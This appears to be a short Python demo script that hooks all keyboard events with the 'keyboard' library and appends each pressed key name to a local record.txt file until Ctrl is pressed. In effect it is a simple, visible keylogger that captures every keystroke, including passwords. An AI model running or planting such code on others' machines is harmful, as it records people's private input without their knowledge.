import keyboard
import os

# Get current path
current_path = os.getcwd()

# Create a txt file to record, or add contents if existed
file = open(current_path+'/record.txt', mode='a+')
file.write('\n')

# The function to process events received
def EventProcess(KeyboardEvent)-> None:
    '''
    Usage: receive events

    '''
    EventName = KeyboardEvent.name
    EventType = KeyboardEvent.event_type

    # EventType has two choices(up&down)
    # Here chooses 'down'
    if EventType != 'up':
        print(EventName)
        file.write(EventName+' ')

keyboard.hook(lambda e:EventProcess(e))

# Run until 'Ctrl' is pressed
keyboard.wait('Ctrl')

file.close()